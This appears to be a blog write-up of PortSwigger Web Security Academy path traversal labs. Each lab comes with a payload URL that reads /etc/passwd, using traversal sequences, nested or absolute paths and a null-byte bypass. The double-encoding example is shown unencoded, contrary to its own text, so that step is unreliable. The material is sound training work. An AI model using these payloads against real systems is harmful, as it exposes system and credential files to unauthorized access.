---
layout: post
title: "Path Traversal - Web Sec academy labs"
pinned: True
---
This post will run through the labs on web sec academy by Portswigger related to Path traversal.

### <u>Lab: File path traversal, simple case
We are asked to retrieve the contents of the "/etc/passwd" file. We can see the image is loaded through it's filename so by changing this parameter and navigating through the file system using "../" we can get the contents by send a request on burp to:
```
https://0a05003804955ada8062ef4d009200a1.web-security-academy.net/image?filename=/../../../etc/passwd
```

### <u>Lab: File path traversal, traversal sequences blocked with absolute path bypass
This time the path traversal is blocked however by supplying the absolute path of the file we can still reach it using the following url:
```
https://0a98002b0476693a8032ad880041000a.web-security-academy.net/image?filename=/etc/passwd
```

### <u>Lab: File path traversal, traversal sequences stripped non-recursively
In this lab the application strips path traversal sequences from the user-supplied filename before using it. However we can bypass using nested traversal sequences "....//".
```
https://0a0a00d2031e790381f82a24009b0099.web-security-academy.net/image?filename=....//....//....//etc/passwd
```

### <u>Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
We can also bypass the path traversal stripping using url encoding or even double url encoding. Thus we can bypass by double encoding this parameter:
```
/image?filename=../../../etc/passwd
```
### <u>Lab: File path traversal, validation of start of path
Sometimes the validation will want to make sure the file is in a certain folder so we will need to start from that folder then traverse to the file we want like the following:
```
https://0a62006c04c196ef814f7582004c006a.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
```
### <u>Lab: File path traversal, validation of file extension with null byte bypass
It could also require the parameter to be a certain file type which is where we can use a the null byte (%00) then put the file extension they want.
```
https://0a04003b035be698805d456400b10079.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg
```